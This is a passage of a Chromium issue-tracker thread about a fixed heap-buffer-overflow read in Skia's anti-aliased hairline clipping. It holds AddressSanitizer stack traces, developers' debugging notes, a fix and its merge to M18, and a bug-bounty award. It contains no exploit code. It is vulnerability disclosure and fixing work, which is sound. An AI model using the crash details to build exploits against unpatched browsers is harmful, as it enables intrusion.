    #47 0x7f283efce043 in IPC::ChannelProxy::Context::OnDispatchMessage(IPC::Message const&) ipc/ipc_channel_proxy.cc:268
    #48 0x7f283eeb3346 in base::Callback<void ()()>::Run() const ./base/callback.h:272
    #49 0x7f283eeb3ba8 in MessageLoop::DeferOrRunPendingTask(base::PendingTask const&) base/message_loop.cc:470
    #50 0x7f283eeb4e99 in MessageLoop::DoWork() base/message_loop.cc:660
    #51 0x7f283eebf3b7 in base::MessagePumpDefault::Run(base::MessagePump::Delegate*) base/message_pump_default.cc:28
    #52 0x7f283eeb1f0e in MessageLoop::RunInternal() base/message_loop.cc:418
BFD: Dwarf Error: Offset (1848602733) greater than or equal to .debug_str size (87128381).
BFD: Dwarf Error: Offset (1949237248) greater than or equal to .debug_line size (56188232).
BFD: Dwarf Error: Offset (1848602733) greater than or equal to .debug_str size (87128381).
BFD: Dwarf Error: Offset (1949237248) greater than or equal to .debug_line size (56188232).
BFD: Dwarf Error: Offset (1949266029) greater than or equal to .debug_str size (87128381).
BFD: Dwarf Error: Offset (1949237248) greater than or equal to .debug_line size (56188232).
BFD: Dwarf Error: Offset (1848602733) greater than or equal to .debug_str size (87128381).
BFD: Dwarf Error: Offset (1949237248) greater than or equal to .debug_line size (56188232).
BFD: Dwarf Error: Offset (1848602733) greater than or equal to .debug_str size (87128381).
BFD: Dwarf Error: Offset (1949237248) greater than or equal to .debug_line size (56188232).
    #53 0x7f283eeb00ff in ~AutoRunState base/message_loop.cc:745
    #54 0x7f2843f3169c in RendererMain(content::MainFunctionParams const&) content/renderer/renderer_main.cc:241
    #55 0x7f283ee09a56 in RunZygote content/app/content_main_runner.cc:245
    #56 0x7f283ee07fca in content::ContentMain(int, char const**, content::ContentMainDelegate*) content/app/content_main.cc:35
    #57 0x7f283d54f137 in ChromeMain chrome/app/chrome_main.cc:32
    #58 0x7f283d54f08b in main chrome/app/chrome_exe_main_gtk.cc:18
    #59 0x7f28369c8c4d in __libc_start_main /build/buildd/eglibc-2.11.1/csu/libc-start.c:258
0x7f282afb9aee is located 0 bytes to the right of 110-byte region [0x7f282afb9a80,0x7f282afb9aee)
allocated by thread T0 here:
    #0 0x7f28451a3ed2 in malloc ??:0
    #1 0x7f28405d3e39 in sk_malloc_flags(unsigned long, unsigned int) skia/ext/SkMemory_new_handler.cpp:62
    #2 0x7f28405e14d0 in SkTDArray<SkAAClip::Builder::Row>::count() const third_party/skia/src/core/SkAAClip.cpp:76
    #3 0x7f28405df79a in SkAAClip::setPath(SkPath const&, SkRegion const*, bool) third_party/skia/src/core/SkAAClip.cpp:1318
    #4 0x7f284053f7e7 in SkRasterClip::setPath(SkPath const&, SkRegion const&, bool) third_party/skia/src/core/SkRasterClip.cpp:78
    #5 0x7f28404d37bf in clipPathHelper third_party/skia/src/core/SkCanvas.cpp:1052
    #6 0x7f28413fec33 in WebCore::GraphicsContext::clip(WebCore::Path const&) third_party/WebKit/Source/WebCore/platform/graphics/skia/GraphicsContextSkia.cpp:367
    #7 0x7f284132aee8 in WebCore::GraphicsContext::addRoundedRectClip(WebCore::RoundedRect const&) third_party/WebKit/Source/WebCore/platform/graphics/GraphicsContext.cpp:590
    #8 0x7f2842542846 in WebCore::RenderWidget::paint(WebCore::PaintInfo&, WebCore::IntPoint const&) third_party/WebKit/Source/WebCore/rendering/RenderWidget.cpp:273
    #9 0x7f28421cc7c4 in WebCore::InlineBox::paint(WebCore::PaintInfo&, WebCore::IntPoint const&, int, int) third_party/WebKit/Source/WebCore/rendering/InlineBox.cpp:233
    #10 0x7f28421dfd55 in WebCore::InlineBox::nextOnLine() const third_party/WebKit/Source/WebCore/rendering/InlineBox.h:185
    #11 0x7f2842548a91 in WebCore::RootInlineBox::hasEllipsisBox() const third_party/WebKit/Source/WebCore/rendering/RootInlineBox.h:95
    #12 0x7f2842413711 in WebCore::InlineFlowBox::nextLineBox() const third_party/WebKit/Source/WebCore/rendering/InlineFlowBox.h:73
    #13 0x7f2842234e45 in WebCore::RenderBlock::paintContents(WebCore::PaintInfo&, WebCore::IntPoint const&) third_party/WebKit/Source/WebCore/rendering/RenderBlock.cpp:2781
    #14 0x7f2842230106 in WebCore::RenderBlock::paint(WebCore::PaintInfo&, WebCore::IntPoint const&) third_party/WebKit/Source/WebCore/rendering/RenderBlock.cpp:2635
    #15 0x7f28422340c3 in WebCore::RenderObject::RenderObjectBitfields::childrenInline() const third_party/WebKit/Source/WebCore/rendering/RenderObject.h:972
    #16 0x7f2842234e57 in WebCore::RenderObject::document() const third_party/WebKit/Source/WebCore/rendering/RenderObject.h:542
    #17 0x7f2842230106 in WebCore::RenderBlock::paint(WebCore::PaintInfo&, WebCore::IntPoint const&) third_party/WebKit/Source/WebCore/rendering/RenderBlock.cpp:2635
    #18 0x7f28422340c3 in WebCore::RenderObject::RenderObjectBitfields::childrenInline() const third_party/WebKit/Source/WebCore/rendering/RenderObject.h:972
    #19 0x7f2842234e57 in WebCore::RenderObject::document() const third_party/WebKit/Source/WebCore/rendering/RenderObject.h:542
    #20 0x7f2842230106 in WebCore::RenderBlock::paint(WebCore::PaintInfo&, WebCore::IntPoint const&) third_party/WebKit/Source/WebCore/rendering/RenderBlock.cpp:2635
    #21 0x7f28423cca01 in WebCore::RenderLayer::paintLayerContents(WebCore::RenderLayer*, WebCore::GraphicsContext*, WebCore::IntRect const&, unsigned int, WebCore::RenderObject*, WebCore::RenderRegion*, WTF::HashMap<WebCore::OverlapTestRequestClient*, WebCore::IntRect, WTF::PtrHash<WebCore::OverlapTestRequestClient*>, WTF::HashTraits<WebCore::OverlapTestRequestClient*>, WTF::HashTraits<WebCore::IntRect> >*, unsigned int) third_party/WebKit/Source/WebCore/rendering/RenderLayer.cpp:2935
    #22 0x7f28423c9bf5 in WebCore::RenderLayer::paintLayer(WebCore::RenderLayer*, WebCore::GraphicsContext*, WebCore::IntRect const&, unsigned int, WebCore::RenderObject*, WebCore::RenderRegion*, WTF::HashMap<WebCore::OverlapTestRequestClient*, WebCore::IntRect, WTF::PtrHash<WebCore::OverlapTestRequestClient*>, WTF::HashTraits<WebCore::OverlapTestRequestClient*>, WTF::HashTraits<WebCore::IntRect> >*, unsigned int) third_party/WebKit/Source/WebCore/rendering/RenderLayer.cpp:2817
==5973== ABORTING
Stats: 7M malloced (9M for red zones) by 26377 calls
Stats: 0M realloced by 211 calls
Stats: 5M freed by 15373 calls
Stats: 0M really freed by 0 calls
Stats: 52M (13320 full pages) mmaped in 13 calls
  mmaps   by size class: 8:32766; 9:8191; 10:4095; 11:2047; 12:1024; 13:512; 14:256; 15:128; 16:64; 17:32; 18:16; 19:8;
  mallocs by size class: 8:22026; 9:1845; 10:1610; 11:450; 12:147; 13:125; 14:101; 15:33; 16:19; 17:15; 18:5; 19:1;
  frees   by size class: 8:11985; 9:1331; 10:1446; 11:278; 12:97; 13:93; 14:88; 15:27; 16:12; 17:10; 18:5; 19:1;
  rfrees  by size class:
Stats: malloc large: 21 small slow: 128
Shadow byte and word:
  0x1fe5055f735d: 6
  0x1fe5055f7358: 00 00 00 00 00 06 fb fb
More shadow bytes:
  0x1fe5055f7338: fd fd fd fd fd fd fd fd
  0x1fe5055f7340: fa fa fa fa fa fa fa fa
  0x1fe5055f7348: fa fa fa fa fa fa fa fa
  0x1fe5055f7350: 00 00 00 00 00 00 00 00
=>0x1fe5055f7358: 00 00 00 00 00 06 fb fb
  0x1fe5055f7360: fa fa fa fa fa fa fa fa
  0x1fe5055f7368: fa fa fa fa fa fa fa fa
  0x1fe5055f7370: fd fd fd fd fd fd fd fd
  0x1fe5055f7378: fd fd fd fd fd fd fd fd


### ep...@google.com (2012-03-09)

Thanks for the tip-of-tree repro...

I've been trying to get the ASAN build (either Debug or Release version) working in gdb, with no luck.  (No matter what I've tried, I cannot get gdb to see any symbols, and thus I cannot set breakpoints.)

So instead I put some printfs in, and figured out that the failure appears to be happening here:
the SECOND time control reaches line 1895 of http://code.google.com/p/skia/source/browse/trunk/src/core/SkAAClip.cpp?r=3281
("rowN = row[0];  // reload")

I have seen a bit of inconsistency in my results, so it is POSSIBLE that it's actually the second time control reaches line 1877 in the same file
("unsigned newAlpha = SkMulDiv255Round(srcAA[0], row[1]);")

Mike has been running the build in the debugger WITHOUT asan... Mike, please use breakpoints around those lines and see if anything looks suspicious...



### ep...@google.com (2012-03-09)

Mike put breakpoints at those lines (tip-of-tree Chromium build, no ASAN, Debug mode, on Windows) and didn't see anything useful...
1. Unlike on my machine, he had to scroll to the right in order for those lines to even be triggered.  That's not the behavior I'm seeing on my machine (M18 branch, ASAN, Debug mode, on Linux)
2. When he scrolled to the right so that the element was visible, the breakpoints did trigger, but all the values seemed kosher.  (And since his is a non-ASAN build, there is no crash.)

I am currently building M18, non-ASAN, Debug mode, on my Linux box in the hopes that it will act as similar as possible to my ASAN build but work in the debugger.

In the meanwhile, I will point out that so far we have NO evidence of bad behavior in non-ASAN builds (that's what has made this so hard to debug).  So if M18 ends up going to Stable without a fix, it may not be such a big deal.

### js...@chromium.org (2012-03-10)

>In the meanwhile, I will point out that so far we have NO evidence of bad behavior in non-ASAN builds (that's what has made this so hard to debug).  So if M18 ends up going to Stable without a fix, it may not be such a big deal.

The difference between stability bugs and security bugs can be a bit confusing. Your statement makes sense for a stability bug, but it's the absolute reverse for a security bug. The worst security issues are the ones that are unlikely to trigger under normal use, but can still be reliably triggered--because they're exploitable but unlikely to be found and fixed.

### gl...@chromium.org (2012-03-12)

I suspect the problems with ASan on Mac are caused by __asan_handle_no_return stripped away. This should be fixed by https://chromiumcodereview.appspot.com/9690009. If the change does not help, we'll need to wait for the next Clang roll.

### ep...@google.com (2012-03-12)

[Empty comment from Monorail migration]

### ep...@google.com (2012-03-12)

[Empty comment from Monorail migration]

### ep...@google.com (2012-03-12)

reed thinks his new http://code.google.com/p/skia/source/detail?r=3366 may fix this.  Checking...

### ca...@chromium.org (2012-03-12)

I see 0110.html crash on m17, m18, and tip of tree (all asan builds, Linux). On those same builds, win.html, and win2.html don't crash.

### ep...@google.com (2012-03-13)

I manually merged Mike's http://code.google.com/p/skia/source/detail?r=3366 into my M18 checkout, and it made the problem go away!

BUT...

Mike sent a Skia DEPS roll (3350->3370) to the trybots as https://chromiumcodereview.appspot.com/9691010/ , and there are hundreds of layout_test failures in Linux and 16 layout_test failures on Mac.  (Windows layout_tests did not run, probably because of typical Windows buildbot problems.)

Mike's previous Skia DEPS roll attempt (3350->3363), https://chromiumcodereview.appspot.com/9662062/ , did not have these layout_test failures, so the tests seem to have been broken in the range 3364-3370.

The only Skia changes of significance in the range 3364-3370 are:
- http://code.google.com/p/skia/source/detail?r=3364 : fix to http://crbug.com/117588 ('Security: Memory Corruption in MaskSuperBlitter'), which I already merged into M18!!!
- http://code.google.com/p/skia/source/detail?r=3366 : apparent fix to this bug

So I am afraid that this fix may cause other problems... unfortunately, we can't see the actual images that the trybots generated, so we can't tell if those test failures are significant or maybe just cause for rebaselining...

I have just kicked off trybots for another Skia DEPS roll to 3365 at https://chromiumcodereview.appspot.com/9689043/ .  Tomorrow morning we can compare its results to the other ones and see what's breaking the layout tests…


### ka...@google.com (2012-03-13)

elliot any update?

### to...@chromium.org (2012-03-13)

I can reproduce on my desktop a HUGE set of image failures when we run Layout tests against ToT Chromium + ToT Skia. Digging deeper.

### to...@chromium.org (2012-03-13)

All the image failures that we've examined are benign - a tiny two-pixel variation at the bottom of a scrollbar. We can land this for security, but there'll another large rebaseline to do.

### ep...@google.com (2012-03-13)

[Empty comment from Monorail migration]

### ep...@google.com (2012-03-13)

Karen, we would like to go ahead and merge http://code.google.com/p/skia/source/detail?r=3366 into M18.  That will fix this bug, but it will break a lot of layout_test results (as described above, a tiny two-pixel variation in hundreds of tests).

Looking at http://go/betabuilders , it seems that there are already massive layout_test failures on the beta branch, so that seems like a reasonable tradeoff to me.

(In trunk, our intent is to land that same change but with a compile-time guard that turns it off until we get a chance to land all the necessary rebaselines.)


### sc...@gmail.com (2012-03-13)

Yep, please merge to M18. Looks like we regressed this in M17 so un-regressing in M18 would be super :)

### ka...@google.com (2012-03-13)

ok i assume u've talked to vangelis? and checked canary?

### ep...@google.com (2012-03-13)

re vangelis: I'll ask him to weigh in here

re canary: We have not landed http://code.google.com/p/skia/source/detail?r=3366 in trunk because of the layout_test breakage (as mentioned above), so there is nothing to see in the canary.  My request is to merge the change into M18 but *not* land it in trunk until we have checked in a bunch of new baseline images (which takes time).


### va...@google.com (2012-03-13)

I'm not sure I totally understand what's going on in that part of the code and what the significance of 64 for is in:

http://code.google.com/p/skia/source/diff?spec=svn3366&r=3366&format=side&path=/trunk/src/core/SkScan_Antihair.cpp

Mike, can you please explain how the fix in that file gets around out of bounds memory access we're talking about here and how significant the out of bounds access is (IIRC you mentioned with the old code in place we could only read up to 1 byte past the end of legal memory). 

I also find this line a bit scary (somewhat of an unrelated comment). Isn't the compiler complaining about an implicit conversion from bool to int?

381	    int fullSpans = istop - istart - (scaleStop > 0);



### [Deleted User] (2012-03-13)

The compiler is complaining that it is turning a bool into an int (1 or 0), which is correct. I think the complain is a performance one, stating that it MUST convert to an int in this case (which is exactly what the code wants).

Antialiasing for a hairline modulates the first and last pixel of the line, since the line may start or end somewhere in the middle of its pixel. This modulation is done base-64. Setting the "scale" to 64 was meant to force that last pixel to be modulated by 1.0 (full on). However, this is the bug! We need to note that when the line extends beyond the clip (e.g. stop >= bottom) that the last pixel (the "stop" pixel) needs to be modulated by 0 (i.e. don't draw!). That is the fix.


### va...@google.com (2012-03-13)

Thanks!  And the security issue is that we could be accessing a pixel that's outside our canvas? 

### [Deleted User] (2012-03-13)

The particular ASAN bug was that I was reading a byte of uninitialized memory, which happens to have been part of my soft-clip datastructure. So, the issue is either an out-of-bounds read (as in the particular bug found) or (potentially, but not seen) an out-of-bounds write (if I ended up drawing 1 pixel beyond the bounds of the device.

### sc...@gmail.com (2012-03-13)

Perhaps this should wait until the first M18 patch given that discussion is still ongoing?

### ka...@google.com (2012-03-13)

sgtm ty.

### sc...@gmail.com (2012-03-23)

So it sounds like we have this change / fix (r3366) on dev channel now (as of today?)

We'll merge it for the first M18 patch if we don't hear of any breakage.

### ep...@google.com (2012-03-30)

Recap:

As noted in https://crbug.com/chromium/106577#c53, http://code.google.com/p/skia/source/detail?r=3366 fixes this bug but breaks hundred of webkit layout_test results (very small pixel diffs).


Update:

The following combination of commits has fixed the bug in such a way that the layout_test results do not change.  It has been running happily in tip-of-tree for about 2 weeks now.

http://code.google.com/p/skia/source/detail?r=3366
http://code.google.com/p/skia/source/detail?r=3376
http://code.google.com/p/skia/source/detail?r=3400


Proposal:

I will cherry-pick the 3 commits listed above to Skia's M18 branch.


Chris and/or Karen: sound good?

### sc...@gmail.com (2012-03-30)

Sounds awesome to me and 2 weeks is a good bake time.

### ep...@google.com (2012-03-30)

Merged into Skia's chrome/1025 branch in http://code.google.com/p/skia/source/detail?r=3552


### sc...@gmail.com (2012-04-04)

@miaubiz: it's hard to say that the OOB content could not be recovered. Therefore $500.

### cl...@chromium.org (2012-04-21)

ClusterFuzz has detected this issue as fixed in range 126778:127382.

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=17431335

Uploader: inferno@chromium.org

Crash Type: Heap-buffer-overflow READ 1
Crash Address: 0x7f203926d4ee
Crash State:
  - crash stack -
  SkAAClipBlitter::blitAntiH
  vertish
  do_anti_hairline
  
Regressed: https://cluster-fuzz.appspot.com/revisions?range=107682:107863
Fixed: https://cluster-fuzz.appspot.com/revisions?range=126778:127382

Minimized Testcase: https://cluster-fuzz.appspot.com/download/AMIfv96KoiDJdxnhHZej3jQEvqvyFFab0WECrpX4at00GcHSwAKkhKotBm2POHJ085jU2oT3gJqYUGJp0mKNCx1ti-_nbaU4C21JILt5r4lrwhufFGMDnUwKsLv0vMHlIpRXarP9GnPh-5z3166Cu_FMpcsdXZ6g_Q

If you suspect that the result above is incorrect, try re-doing that job on the testcase report page.

### sc...@gmail.com (2012-05-10)

Payment in system (part of a $8500 batch)

### [Deleted User] (2012-05-15)

Marking old security bugs Fixed..

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-01)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-06-14)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### ss...@google.com (2017-02-07)

Moving old issues out of Internal>Graphics to delete this obsolete component (crbug.com/685425 for details)

[Monorail components: -Internals>Graphics Internals>GPU]

### ss...@google.com (2017-02-07)

Moving old issues out of Internal>Graphics to delete this obsolete component (crbug.com/685425 for details)

[Monorail components: -Internals>Graphics Internals>GPU]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/106577?no_tracker_redirect=1

[Multiple monorail components: Internals, Internals>GPU, Internals>Skia]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40051879)*
